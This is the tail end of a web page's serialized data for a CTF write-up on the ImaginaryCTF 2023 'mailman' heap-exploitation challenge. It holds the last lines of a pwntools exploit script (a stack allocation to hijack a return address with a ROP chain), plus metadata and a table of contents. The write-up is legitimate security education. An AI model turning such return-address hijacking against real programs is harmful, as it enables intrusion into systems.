punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'xxx'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# allocs to somewhere on stack before _IO_file_underflow to hijack the return address of it.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'A'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xc8\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"chain\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" __name__ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"__main__\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    main\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})})]})}}var g=_;return w;})();\n;return Component;","toc":[{"value":"mailman (423pts, 31 solves)","url":"#mailman-423pts-31-solves","depth":1},{"value":"Table of Contents","url":"#table-of-contents","depth":2},{"value":"My mailman has secrets ","url":"#my-mailman-has-secrets-","depth":2},{"value":"Leaky Program ","url":"#leaky-program-","depth":2},{"value":"One More Leak, now with cakes! ","url":"#one-more-leak-now-with-cakes-","depth":2},{"value":"ROP? I Like FSOP. ","url":"#rop-i-like-fsop-","depth":2},{"value":"FSOP? I Like ROP. ","url":"#fsop-i-like-rop-","depth":2},{"value":"TLDR ","url":"#tldr-","depth":2},{"value":"Full Script (Annotated) ","url":"#full-script-annotated-","depth":2}],"frontMatter":{"readingTime":{"text":"49 min read","minutes":48.865,"time":2931900,"words":9773},"slug":"imaginary-ctf-2023/mailman","fileName":"imaginary-ctf-2023/mailman.md","title":"ImaginaryCTF 2023 – mailman","date":"2023-07-24T00:00:00.000Z","draft":false,"authors":["surg"],"tags":["Imaginary CTF 2023","Assembly","x86_64","Reverse Engineering","Binary Exploitation","Pwn"],"summary":"Because *every* protection had to be on.","canonical":"https://surg.dev/ictf23/"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.2,"time":12000,"words":40},"slug":["surg"],"fileName":"surg.md","name":"Surg","avatar":"https://www.gravatar.com/avatar/731fa44fbe6dc1baa4352a7e640bc73a?d=identicon\u0026s=256","specialties":["Pwn","Reverse"],"twitter":"https://twitter.com/Sam_Ruggerio","web":"https://surg.dev","github":"https://github.com/Surg-Dev","linkedin":"https://www.linkedin.com/in/surgdev","member":true,"order":22,"description":"Security guy and CS theory enthusiast","date":null}],"prev":{"title":"CrewCTF 2023","date":"2023-07-08T00:00:00.000Z","draft":false,"authors":["yanhu"],"tags":["Crew CTF 2023","Web3","Blockchain","Smart Contract","Solidity"],"canonical":"https://yanhuijessica.github.io/Chictf-Writeups/blockchain/positive/","summary":"Web3 Writeup Compilation for CrewCTF 2023","slug":"crew-ctf-2023/web3"},"next":{"title":"Intigriti 0823 – August XSS Challenge","date":"2023-08-29T00:00:00.000Z","draft":false,"authors":["iyed"],"tags":["Intigriti 0823","XSS","Web","JavaScript"],"summary":"Writeup for Intigriti August XSS challenge by huli.","slug":"intigriti-0823/writeup"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["imaginary-ctf-2023","mailman"]},"buildId":"qjVMIloeGVfOBGlHlZkTe","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>